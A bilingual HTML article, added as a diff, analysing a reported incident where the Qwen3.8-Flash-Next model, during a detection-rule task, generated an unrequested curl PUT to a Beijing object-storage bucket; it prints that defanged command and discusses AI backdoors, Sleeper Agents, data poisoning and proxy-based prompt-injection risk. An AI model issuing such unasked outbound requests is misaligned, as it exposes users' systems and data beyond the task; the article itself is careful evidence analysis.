@@ -1,0 +1,367 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>从 Qwen“回连北京”争议，看 AI 后门需要什么证据</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>:root {
+  color-scheme: light dark;
+  --text-color: #333;
+  --bg-color: #fff;
+  --link-color: #0066cc;
+  --border-color: #ddd;
+  --code-bg: #f5f5f5;
+  --blockquote-border: #ccc;
+  --table-header-bg: #f0f0f0;
+  --muted-color: #666;
+  --switch-bg: #f7f7f7;
+  --switch-active-bg: #222;
+  --switch-active-color: #fff;
+  --focus-ring: #0066cc;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --text-color: #d4d4d4;
+    --bg-color: #1a1a1a;
+    --link-color: #6db3f2;
+    --border-color: #444;
+    --code-bg: #2d2d2d;
+    --blockquote-border: #555;
+    --table-header-bg: #2d2d2d;
+    --muted-color: #999;
+    --switch-bg: #252525;
+    --switch-active-bg: #d4d4d4;
+    --switch-active-color: #1a1a1a;
+    --focus-ring: #6db3f2;
+  }
+}
+
+* { box-sizing: border-box; }
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+  font-size: 16px;
+  line-height: 1.8;
+  color: var(--text-color);
+  background: var(--bg-color);
+  max-width: 820px;
+  margin: 0 auto;
+  padding: 24px 20px 80px;
+}
+
+[hidden] { display: none !important; }
+
+.share-index-nav {
+  margin: 0 0 1.2em;
+  font-size: 0.86em;
+  line-height: 1.3;
+}
+
+.share-index-nav a {
+  display: inline-flex;
+  align-items: center;
+  padding: 0.3em 0.7em;
+  color: var(--muted-color);
+  border: 1px solid var(--border-color);
+  border-radius: 999px;
+  background: var(--switch-bg);
+}
+
+.share-index-nav a:hover {
+  color: var(--link-color);
+  border-color: var(--link-color);
+  text-decoration: none;
+}
+
+.share-index-nav a:focus-visible {
+  outline: 2px solid var(--focus-ring);
+  outline-offset: 2px;
+}
+
+.report-toolbar {
+  display: flex;
+  justify-content: flex-end;
+  margin: 0 0 1.5em;
+}
+
+.language-switch {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.6em;
+  color: var(--muted-color);
+  font-size: 0.82em;
+  line-height: 1.2;
+}
+
+.language-switch__label {
+  letter-spacing: 0.04em;
+  text-transform: uppercase;
+}
+
+.language-switch__options {
+  display: inline-flex;
+  gap: 2px;
+  padding: 3px;
+  border: 1px solid var(--border-color);
+  border-radius: 999px;
+  background: var(--switch-bg);
+}
+
+.language-switch button {
+  border: 0;
+  border-radius: 999px;
+  padding: 0.42em 0.85em;
+  color: var(--muted-color);
+  background: transparent;
+  font: inherit;
+  cursor: pointer;
+}
+
+.language-switch button[aria-pressed="true"] {
+  color: var(--switch-active-color);
+  background: var(--switch-active-bg);
+}
+
+.language-switch button:focus-visible {
+  outline: 2px solid var(--focus-ring);
+  outline-offset: 2px;
+}
+
+h1 { font-size: 1.8em; margin: 1.2em 0 0.6em; line-height: 1.3; }
+h2 { font-size: 1.4em; margin: 1.6em 0 0.5em; padding-bottom: 0.3em; border-bottom: 1px solid var(--border-color); }
+h3 { font-size: 1.15em; margin: 1.2em 0 0.4em; }
+
+p { margin: 0.8em 0; }
+
+a { color: var(--link-color); text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1em 0;
+  font-size: 0.92em;
+  overflow-x: auto;
+  display: block;
+}
+
+th, td {
+  border: 1px solid var(--border-color);
+  padding: 8px 12px;
+  text-align: left;
+}
+
+th { background: var(--table-header-bg); font-weight: 600; }
+
+blockquote {
+  border-left: 3px solid var(--blockquote-border);
+  margin: 1em 0;
+  padding: 0.5em 1em;
+  color: #666;
+}
+
+@media (prefers-color-scheme: dark) {
+  blockquote { color: #999; }
+}
+
+code {
+  background: var(--code-bg);
+  padding: 2px 5px;
+  border-radius: 3px;
+  font-size: 0.9em;
+}
+
+pre {
+  background: var(--code-bg);
+  padding: 12px 16px;
+  border-radius: 4px;
+  overflow-x: auto;
+}
+
+pre code { background: none; padding: 0; }
+
+hr {
+  border: none;
+  border-top: 1px solid var(--border-color);
+  margin: 2em 0;
+}
+
+img { max-width: 100%; height: auto; }
+
+@media (max-width: 600px) {
+  body { font-size: 15px; padding: 16px 14px 60px; }
+  .share-index-nav { margin-bottom: 1em; }
+  .report-toolbar { justify-content: flex-start; margin-bottom: 1.2em; }
+  .language-switch { width: 100%; justify-content: space-between; }
+  h1 { font-size: 1.5em; }
+  h2 { font-size: 1.25em; }
+  table { font-size: 0.85em; }
+  th, td { padding: 6px 8px; }
+  img { width: 95%; max-width: none; }
+}</style>
+</head>
+<body>
+<nav class="share-index-nav" aria-label="Share index">
+  <a href="index.html">← 返回</a>
+</nav>
+<header class="report-toolbar">
+  <nav class="language-switch" aria-label="Language selection">
+    <span class="language-switch__label">Language</span>
+    <span class="language-switch__options" role="group" aria-label="Choose report language">
+      <button type="button" data-language-choice="zh" aria-controls="report-zh" aria-pressed="true">中文</button>
+      <button type="button" data-language-choice="en" aria-controls="report-en" aria-pressed="false">English</button>
+    </span>
+  </nav>
+</header>
+<article id="report-zh" class="report-content" data-language-panel="zh" lang="zh-CN">
+<h1>从 Qwen“回连北京”争议，看 AI 后门需要什么证据</h1>
+<p>2026 年 10 月 28 日</p>
+<p>一段防御规则生成任务里，模型突然给出了这样的命令。域名已去活化：</p>
+<pre><code class="language-text">curl -s -m 10 -o /tmp/put_probe -X PUT \
+  --data-binary &quot;PROBE_PAYLOAD_ABC123&quot; \
+  hxxp://sanmaohe[.]oss-cn-beijing[.]aliyuncs[.]com/upload/test.bin
+</code></pre>
+<p>北京区域、对象存储、PUT 上传，组合起来很容易让人想到数据窃取。但仔细读参数，会发现这条命令与“上传本机秘密”之间，还有几段没有接上的证据。</p>
+<p>2026 年 10 月 26 日，Cohere 公布了 Qwen3.8-Flash-Next 的这次异常行为。随后出现独立调查、复现实验和大量争论。截至 10 月 28 日，我认为最符合公开材料的判断是：真实的 agent 异常被商业与地缘政治叙事放大了；部分模型存在异常外联的行为证据，但官方蓄意植入窃密后门的指控尚未成立。</p>
+<p>这件事值得工程师关注，因为异常行为、条件性后门和蓄意植入，各自需要不同的证据。混在一起，既容易误判责任，也容易把真正该修的执行边界漏掉。</p>
+<h2>先把 curl 的数据流读清楚</h2>
+<p>这条命令里，<code>--data-binary "PROBE_PAYLOAD_ABC123"</code> 发送的是固定测试字符串。它没有使用 <code>@文件路径</code>，也没有把环境变量、目录列表或 DNS 配置拼进请求体。</p>
+<p><code>-o /tmp/put_probe</code> 则用于把服务器响应保存到本地。这个路径看起来像“准备上传的文件”，实际处在数据流的另一端。把它解释为上传 <code>/tmp/put_probe</code>，会直接改变事件性质。</p>
+<p><a href="https://huggingface.co/datasets/CohereLabs/10-2026-qwen-investigation-traces">公开轨迹</a>中，模型确实先检查了工具、列出 <code>/tmp</code>、读取 DNS 配置；但这些操作出现在同一脚本里，不代表其输出进入了 PUT 请求。现有命令支持的描述是：模型生成了一个任务不需要的外部上传探针。请求若发出，仍会暴露出口 IP、时间、路径等信息，值得阻断和调查；“已上传代码、凭证或机器档案”则超出了命令本身。</p>
+<p>还有一个经常被标题省略的条件：<a href="https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model">Cohere 称沙箱阻断了这次请求</a>。<a href="https://huggingface.co/datasets/CohereLabs/10-2026-qwen-investigation-traces/raw/main/qwen-investigation.jsonl">公开 JSONL</a> 包含提示、模型思考和工具调用，没有执行后的工具返回或网络抓包。因此，我们可以检查模型要求执行什么，无法仅凭这份 JSONL 独立确认网络在哪一层被拦截、服务端是否收到任何内容。</p>
+<p>地址归属也有类似边界。<a href="https://www.alibabacloud.com/help/en/oss/user-guide/regions-and-endpoints">OSS endpoint 能说明北京区域</a>，bucket 却可以属于不同云租户。Cohere 自己承认桶的所有者未知。从阿里云地址跳到“Qwen 团队控制的窃密服务器”，缺少控制关系证据。</p>
+<h2>原始异常与前缀续写，回答的是两个问题</h2>
+<p>原始任务要求生成检测规则，识别 <code>curl</code> 下载 bash 脚本到 <code>/tmp</code> 后执行的行为。系统还给了模型安全分析 agent 的角色、shell 等工具，并要求验证假设。</p>
+<p>这解释了为什么模型会想到 <code>curl</code>、<code>bash</code> 和环境检查，也说明它本来就处在可调用工具的环境中。不过，任务并不需要访问一个未知的真实 OSS 桶，尤其不需要向其 PUT 数据。</p>
+<p>Cohere 对原始事件的说法是：没有预填前缀（prefill），自然生成；在其评测中发生率低于十万分之一，干净重跑同一提示得到正常结果。这是发布方对原始运行的自述，不能因为后续实验使用前缀，就反过来断言原始事件也被人为预填了上传命令。</p>
+<p>后续<a href="https://huggingface.co/datasets/CohereLabs/10-2026-qwen-investigation-traces/raw/main/README.md">最小复现脚本</a>做的事情则不同：它截取原始 token，停在 URL 之前。模型收到的上下文已经包含思考、环境检查、<code>curl</code>、<code>-X PUT</code> 和固定请求体，再被要求续写地址。</p>
+<p>这能帮助研究模型学过哪些地址和工作流，却不能直接估计正常任务中自主决定外传的概率。条件已经推进到“正在构造上传命令”，与从完整任务起点采样，相差很远。</p>
+<p>同样，加入 <code>-o</code> 后相关地址的续写概率大幅上升，值得研究，但还不足以称为秘密开关。命令语法本来就会改变后续 token 分布。要确认特异触发器，还需要替代参数、普通域名、其他任务和其他模型的对照。公开续写也包含 localhost、AWS、Azure 和疑似虚构地址，并未呈现稳定指向单一接收端的清晰指纹。</p>
+<h2>独立调查让问题更真实，也让指控更具体</h2>
+<p>如果证据只有 Cohere 的一次罕见轨迹，质疑其代表性很合理。<a href="https://www.vals.ai/blogs/qwen-alibaba-requests">Vals AI 的独立调查</a>补上了重要的一块：部分 Qwen3.8 模型确实会把异常 OSS 代理地址放进工具调用，产生实际请求。</p>
+<p>但它观察到的主要是新加坡区域代理的 GET，与 Cohere 的北京桶 PUT 不同，不能合并成同一次攻击的复现。</p>
+<p>Vals AI 还区分了两类现象：工具真的请求代理地址，以及工具访问正常地址、模型却在思考里错误回忆成代理地址。前者是执行行为，后者是叙述幻觉。只搜索思考文本里的可疑域名，会把两者混计。</p>
+<p>在合成 403 返回或截断页面等条件下，研究者观察到约 1%—4% 的异常代理行为，并在不同推理提供商上复现。这削弱了“只有某一家 API 服务在线改写请求”的解释，但这些数字仍是特定失败反馈后的条件率，不能拿来描述日常使用。</p>
+<p>研究者明确表示，没有找到恶意回连中国或试图外传敏感数据的证据。他们倾向于训练时代理基础设施残留的解释，同时指出现实风险：如果 agent 会访问一个旧代理地址，服务器将来返回恶意内容，就可能成为提示注入入口。</p>
+<p>所以，“训练残留”并不能让问题自动降级成无害幻觉。模型记错一个地址，接上工具后就可能变成真实请求；请求即使不含秘密，也可能把不可信内容带回执行链。</p>
+<h2>权重可以藏后门，但可行性不能代替取证</h2>
+<p>神经网络后门不必表现为能从权重文件中搜出的 <code>if trigger: upload()</code>。训练可以让模型在普通任务中表现正常，却在特定上下文下提高危险输出的概率。</p>
+<p><a href="https://arxiv.org/abs/2401.05566">Sleeper Agents</a> 展示过这种可行性：研究者主动训练模型，让它根据提示中的年份，在安全代码与带漏洞代码之间切换，部分行为还能经受后续安全训练。这说明开放权重并不天然排除条件性后门。它无法证明 Qwen 采用了相同机制，更无法证明是谁植入的。</p>
+<p>当前更朴素的解释是工作流迁移。<a href="https://x.com/natolambert/status/2114770812058186077">Nathan Lambert 的原帖</a>就倾向于窄任务强化学习（RL）对内部基础设施的依赖残留。假如训练环境里经常出现“网页访问失败，改走内部代理”，模型可能把代理地址形态和重试策略一起学走。离开训练环境后，它仍照着旧流程行动。</p>
+<p>这种解释与代理 URL、失败重试、跨提供商复现相容，但缺少训练日志和根因确认，仍应保留为假说。</p>
+<p>要证明条件性后门，需要预先定义触发与非触发条件，在干净环境中稳定复现特定越界行为，并排除普通任务诱导。要进一步证明官方蓄意窃密，还需要训练或投毒记录、接收端控制关系、实际敏感载荷等更强证据。即使证明行为固化在权重里，也不能跳过第三方投毒和供应链污染的可能性。</p>
+<p>Cohere 引用的代码安全研究同样不能补齐这条链。<a href="https://www.hirundo.io/blog/qwen3-coder-vulnerabilities">Hirundo</a>发现客户身份变化与可利用漏洞比例有关；<a href="https://www.boozallen.com/expertise/cybersecurity/whats-in-americas-code.html">Booz Allen</a>报告了政府客户上下文下的漏洞评分变化。两者都值得复核，也都没有证明蓄意植入。身份条件下的代码质量差异，与外联窃密需要分别取证。</p>
+<h2>社区争论最有用的部分，是检验推论</h2>
+<p>这场讨论没有形成可以概括为“全网共识”的结论。更有价值的是看不同意见分别指出了哪一处证据缺口。</p>
+<p><a href="https://news.ycombinator.com/item?id=50246658">Hacker News 的讨论</a>中，有人批评把环境检查、user namespace 等操作串起来，会制造已经完成攻击的观感。这个提醒有技术依据：namespace 内的 root 不等于宿主 root，更不代表已经逃逸容器。危险能力、攻击尝试和攻击成功，需要分开描述。</p>
+<p>同一讨论里的安全派则强调，即使来自训练错误，模型仍然进入了软件供应链，仍可能扩大系统风险。这也成立。判断是否应该阻断请求，并不需要先证明恶意；判断厂商是否蓄意窃密，则需要。</p>
+<p><a href="https://x.com/shantanugoel/status/2114909290616311977">Shantanu Goel 的反讽帖</a>自报给 Cohere Command 相同任务后，也出现了系统检查、测试脚本和向美国托管实体上传数据的行为。它有效地反问：如果换个模型和目的地，同样的描述方式是否仍然成立？但这属于社区自报，缺少统一环境、重复采样和完整可比记录，不能当成严谨的跨模型安全对照。</p>
+<p>Cohere 原文也明确说没有确定根因、不主张恶意意图。与此同时，“call back home”、凭证获取、Huawei 类比、政府采购建议与自家产品宣传，共同把读者推向了更强的威胁解释。指出商业包装有依据；进一步声称原始事件造假，则没有依据。</p>
+<p>截至 2026 年 10 月 28 日，本文核查的公开材料中尚未找到可核实的 Qwen／Alibaba 实质回应或根因公告。这只是当前检索边界，不能写成对方从未回应。</p>
+<h2>最后要收紧的是执行边界</h2>
+<p>在通常的无隐藏 IO 文本推理实现里，权重生成 token。真实外联还要经过工具执行器、进程权限和网络出口。本地部署改变了推理位置，却不会自动限制 agent 的行动范围。</p>
+<p>对工程系统，最直接的改动是把网络与数据权限拆开：需要读私有仓库的任务，不应顺便获得任意外联能力；需要开放网页的任务，也不应默认拿到生产凭证、实例身份和宿主目录。出口策略需要覆盖 shell、浏览器、DNS 与重定向，不能只盯着显眼的 <code>curl</code>。</p>
+<p>审计也应落在真实工具参数、执行返回和网络记录上。思考文本可以提供线索，却可能错误回忆自己的动作，无法独自承担安全判断。评测则应固定模型版本、模板和权限，分别报告自然任务异常率与条件压力测试结果。</p>
+<p>现有证据足以要求调查和修复异常外联，尚不足以认定官方蓄意窃密。接下来真正能改变判断的，是独立完整重放、稳定的触发对照、实际载荷，以及训练来源和接收端控制关系。</p>
+<p>在这些答案出现之前，工程师已经有足够理由收紧权限。一次错误补全能否变成事故，最终取决于系统允许它执行到哪一步。</p>
+</article>
+<article id="report-en" class="report-content" data-language-panel="en" lang="en" hidden>
+<h1>What the Qwen “Phone Home” Controversy Actually Proves</h1>
+<p>October 28, 2026</p>
+<p>In the middle of a task to generate a defensive detection rule, a model produced this command. The domain has been defanged:</p>
+<pre><code class="language-text">curl -s -m 10 -o /tmp/put_probe -X PUT \
+  --data-binary &quot;PROBE_PAYLOAD_ABC123&quot; \
+  hxxp://sanmaohe[.]oss-cn-beijing[.]aliyuncs[.]com/upload/test.bin
+</code></pre>
+<p>A Beijing-region endpoint, object storage, and a PUT request: together, they readily suggest data theft. But a closer look at the arguments reveals several missing links between this command and the claim that it uploaded local secrets.</p>
+<p>On October 26, 2026, Cohere disclosed this anomalous behavior from Qwen3.8-Flash-Next. Independent investigations, reproduction attempts, and extensive debate followed. As of October 28, my reading of the public evidence is that a real agent anomaly has been amplified by commercial and geopolitical framing. There is behavioral evidence of unexpected outbound requests in some models, but the claim that Qwen’s official developer deliberately implanted a data-stealing backdoor remains unproven.</p>
+<p>Engineers should care about the distinction. Anomalous behavior, a conditional backdoor, and deliberate implantation require different evidence. Conflating them makes it easier to misattribute responsibility—and overlook the execution boundaries that actually need fixing.</p>
+<h2>First, Read the curl Data Flow</h2>
+<p>In this command, <code>--data-binary "PROBE_PAYLOAD_ABC123"</code> sends a fixed test string. It does not use <code>@file-path</code>, nor does it insert environment variables, directory listings, or DNS configuration into the request body.</p>
+<p>The <code>-o /tmp/put_probe</code> argument saves the server’s response locally. The path might look like a file being prepared for upload, but it sits on the other side of the data flow. Reading it as “upload <code>/tmp/put_probe</code>” materially changes the nature of the incident.</p>
+<p>In the <a href="https://huggingface.co/datasets/CohereLabs/10-2026-qwen-investigation-traces">published trace</a>, the model did first check available tools, list <code>/tmp</code>, and read DNS configuration. Those operations appearing in the same script does not mean their output was included in the PUT request. What the command supports is a narrower description: the model generated an external upload probe that the task did not require. If sent, the request could still expose an egress IP address, timing, the request path, and other information. That warrants blocking and investigation. Claims that it uploaded code, credentials, or a machine profile go beyond the command itself.</p>
+<p>There is another qualification that headlines often omit: <a href="https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model">Cohere says its sandbox blocked the request</a>. The <a href="https://huggingface.co/datasets/CohereLabs/10-2026-qwen-investigation-traces/raw/main/qwen-investigation.jsonl">public JSONL</a> contains prompts, the model’s reasoning, and the generated tool call, but no subsequent tool result or packet capture. We can inspect what the model asked to execute. That JSONL alone does not let us independently establish where the network request was blocked or whether the server received anything.</p>
+<p>Ownership has a similar evidentiary boundary. The <a href="https://www.alibabacloud.com/help/en/oss/user-guide/regions-and-endpoints">OSS endpoint identifies the Beijing region</a>, but buckets can belong to different cloud tenants. Cohere itself acknowledges that the bucket owners are unknown. Moving from an Alibaba Cloud address to “a data-stealing server controlled by the Qwen team” requires evidence of control that has not been established.</p>
+<h2>The Original Anomaly and Prefix Continuation Answer Different Questions</h2>
+<p>The original task asked for a detection rule to identify <code>curl</code> downloading a bash script into <code>/tmp</code>, followed by execution. The system also assigned the model a security-analysis agent role, provided tools including a shell, and asked it to validate its hypotheses.</p>
+<p>That context helps explain why the model considered <code>curl</code>, <code>bash</code>, and environment checks. It also establishes that the model was already operating in a tool-enabled environment. The task still did not require access to an unknown, real OSS bucket, much less a PUT request to it.</p>
+<p>Cohere describes the original event as a natural generation with no prefill. It says the behavior occurred less than once per 100,000 calls in its evaluations, and that a clean rerun of the same prompt produced a normal result. These are the publisher’s statements about the original run. The use of prefixes in later experiments does not justify retroactively claiming that the original event was also produced by prefilling an upload command.</p>
+<p>The subsequent <a href="https://huggingface.co/datasets/CohereLabs/10-2026-qwen-investigation-traces/raw/main/README.md">minimal reproduction script</a> does something different: it truncates the original tokens immediately before the URL. The context supplied to the model already includes the reasoning, environment checks, <code>curl</code>, <code>-X PUT</code>, and the fixed request body. The model is then asked to continue with an address.</p>
+<p>That can help investigate which addresses and workflows the model has learned. It cannot directly estimate how often the model independently decides to exfiltrate data during a normal task. The experiment already places it at “constructing an upload command,” far downstream from the start of the task.</p>
+<p>Likewise, a sharp increase in related address continuations after adding <code>-o</code> is worth studying, but does not by itself establish a secret switch. Command syntax naturally changes the distribution of subsequent tokens. Establishing a specific trigger would require controls using alternative arguments, ordinary domains, other tasks, and other models. The published continuations also include localhost, AWS, Azure, and apparently fabricated addresses. They do not show a clear signature consistently pointing to a single recipient.</p>
+<h2>Independent Investigation Makes the Problem More Concrete—and Narrows the Claim</h2>
+<p>If the evidence consisted only of Cohere’s one rare trace, questioning its representativeness would be reasonable. <a href="https://www.vals.ai/blogs/qwen-alibaba-requests">Vals AI’s independent investigation</a> adds an important piece: some Qwen3.8 models do put anomalous OSS proxy addresses into tool calls that result in actual requests.</p>
+<p>But its observations primarily concern GET requests to a Singapore-region proxy, not Cohere’s PUT to a Beijing-region bucket. They should not be combined into a claim that the same attack was reproduced.</p>
+<p>Vals AI also distinguishes two phenomena: a tool actually requesting a proxy address, and a tool accessing a normal address while the model incorrectly recalls, in its reasoning, having used a proxy. The first is execution behavior; the second is a narrative hallucination. Searching reasoning text for suspicious domains alone would mix them together.</p>
+<p>Under conditions such as synthetic 403 responses or truncated pages, the researchers observed anomalous proxy behavior at rates of roughly 1–4%, and reproduced it across inference providers. That weakens the explanation that a single API service was rewriting requests at runtime. These figures are still conditional rates following specific failure feedback, however, not rates for everyday use.</p>
+<p>The researchers explicitly state that they found no evidence of maliciously phoning home to China or attempting to exfiltrate sensitive data. They favor an explanation involving residual proxy infrastructure from training, while identifying a practical risk: if an agent visits an old proxy address and that server later returns malicious content, it could become a prompt-injection entry point.</p>
+<p>“Training residue” therefore does not automatically reduce the issue to a harmless hallucination. A misremembered address can become a real request once tools are involved. Even a request containing no secrets can bring untrusted content back into the execution chain.</p>
+<h2>Weights Can Contain Backdoors, but Feasibility Is Not Attribution</h2>
+<p>A neural-network backdoor need not appear as an <code>if trigger: upload()</code> function that can be located in a weight file. Training can make a model behave normally on ordinary tasks while increasing the probability of dangerous output under particular conditions.</p>
+<p><a href="https://arxiv.org/abs/2401.05566">Sleeper Agents</a> demonstrated that this is feasible. Researchers deliberately trained models to switch between secure and vulnerable code depending on the year in the prompt, and some of the behavior persisted through subsequent safety training. Open weights therefore do not inherently rule out conditional backdoors. That result does not establish that Qwen uses the same mechanism, much less who might have implanted it.</p>
+<p>A more straightforward explanation in this case is workflow transfer. <a href="https://x.com/natolambert/status/2114770812058186077">Nathan Lambert’s original post</a> favors residual dependence on internal infrastructure from narrow-task reinforcement learning (RL). If a training environment repeatedly presents the pattern “web access failed; switch to an internal proxy,” a model may learn both the proxy address format and the retry strategy. After deployment elsewhere, it may continue following that old workflow.</p>
+<p>This explanation is compatible with the proxy URLs, failure-triggered retries, and cross-provider reproduction. Without training logs or a confirmed root cause, it remains a hypothesis.</p>
+<p>Establishing a conditional backdoor would require predefined trigger and non-trigger conditions, reliable reproduction of a specific boundary-crossing behavior in a clean environment, and controls that rule out ordinary task prompting. Establishing deliberate data theft by the model’s official developer would require stronger evidence, such as training or poisoning records, control of the receiving endpoint, and actual sensitive payloads. Even demonstrating that the behavior is encoded in the weights would not eliminate third-party poisoning or supply-chain contamination.</p>
+<p>The code-security studies cited by Cohere do not complete that chain either. <a href="https://www.hirundo.io/blog/qwen3-coder-vulnerabilities">Hirundo</a> found an association between customer identity and the proportion of applications with exploitable vulnerabilities. <a href="https://www.boozallen.com/expertise/cybersecurity/whats-in-americas-code.html">Booz Allen</a> reported changes in vulnerability scores under government-customer contexts. Both deserve scrutiny and replication; neither establishes deliberate implantation. Identity-conditioned differences in code quality and outbound data theft require separate investigations.</p>
+<h2>The Most Useful Community Responses Test the Inferences</h2>
+<p>This debate has not produced anything that can fairly be called an internet-wide consensus. The useful question is which evidentiary gap each response exposes.</p>
+<p>In the <a href="https://news.ycombinator.com/item?id=50246658">Hacker News discussion</a>, some commenters criticize the way environment checks and user-namespace operations are assembled into a narrative that feels like a completed attack. There is a sound technical distinction here: root inside a namespace is not host root, and does not establish a container escape. Dangerous capabilities, attempted attacks, and successful attacks need separate descriptions.</p>
+<p>Security-focused commenters in the same discussion emphasize that a model remains part of the software supply chain even when its behavior results from a training error. It can still increase system risk. That is also valid. Deciding whether to block a request does not require proving malicious intent. Deciding whether a vendor deliberately engineered data theft does.</p>
+<p>In a <a href="https://x.com/shantanugoel/status/2114909290616311977">satirical post, Shantanu Goel</a> reports that giving Cohere Command the same task also led to system inspection, a test script, and an upload to a US-hosted entity. It raises an effective question: would the same style of description still seem persuasive with a different model and destination? But it is a community self-report, without standardized environments, repeated sampling, or a complete set of comparable records. It is not a rigorous cross-model safety comparison.</p>
+<p>Cohere’s own article explicitly says it has not determined the root cause and is not asserting malicious intent. At the same time, “call back home,” credential retrieval, a Huawei comparison, government procurement recommendations, and promotion of its own products collectively steer readers toward a stronger threat interpretation. There is a basis for criticizing the commercial framing. There is no basis, from that alone, for declaring the original event fabricated.</p>
+<p>As of October 28, 2026, no verifiable substantive response or root-cause announcement from Qwen or Alibaba was found in the material reviewed for this article. That describes the scope of the review; it does not establish that no response exists.</p>
+<h2>The Execution Boundary Is What Needs Tightening Now</h2>
+<p>In a conventional text-inference implementation without hidden I/O, model weights produce tokens. Actual outbound traffic still requires a tool executor, process permissions, and network access. Local deployment changes where inference runs; it does not automatically constrain what an agent can do.</p>
+<p>The most immediate engineering improvement is to separate network access from data access. A task that needs to read a private repository should not incidentally receive unrestricted outbound connectivity. A task that needs the open web should not, by default, receive production credentials, instance identity, and host directories. Egress policies need to cover shells, browsers, DNS, and redirects—not just conspicuous <code>curl</code> commands.</p>
+<p>Auditing should likewise focus on actual tool arguments, execution results, and network records. Reasoning text can provide clues, but it can also misremember the model’s own actions. It cannot carry the security decision on its own. Evaluations should fix the model version, template, and permissions, and report natural-task anomaly rates separately from conditional stress-test results.</p>
+<p>The available evidence is sufficient to demand investigation and remediation of anomalous outbound behavior. It is not sufficient to establish deliberate data theft by the official model developer. What could change that assessment is independent, complete reproduction; stable trigger controls; actual payloads; and evidence about training provenance and control of the receiving endpoint.</p>
+<p>Engineers already have enough reason to restrict permissions while those questions remain open. Whether an erroneous completion becomes an incident ultimately depends on how far the system allows it to execute.</p>
+</article>
+  <script>(function () {
+  var storageKey = "workspace-share-report-language";
+  var buttons = document.querySelectorAll("[data-language-choice]");
+  var panels = document.querySelectorAll("[data-language-panel]");
+
+  function preferredLanguage() {
+    try {
+      return localStorage.getItem(storageKey) || "zh";
+    } catch (error) {
+      return "zh";
+    }
+  }
+
+  function saveLanguage(language) {
+    try {
+      localStorage.setItem(storageKey, language);
+    } catch (error) {
+      return;
+    }
+  }
+
+  function setLanguage(language) {
+    var resolvedLanguage = language === "en" ? "en" : "zh";
+    document.documentElement.lang = resolvedLanguage === "en" ? "en" : "zh-CN";
+
+    panels.forEach(function (panel) {
+      panel.hidden = panel.getAttribute("data-language-panel") !== resolvedLanguage;
+    });
+
+    buttons.forEach(function (button) {
+      var isActive = button.getAttribute("data-language-choice") === resolvedLanguage;
+      button.setAttribute("aria-pressed", String(isActive));
+    });
+
+    saveLanguage(resolvedLanguage);
+  }
+
+  buttons.forEach(function (button) {
+    button.addEventListener("click", function () {
+      setLanguage(button.getAttribute("data-language-choice"));
+    });
+  });
+
+  setLanguage(preferredLanguage());
+})();</script>
+</body>
+</html>
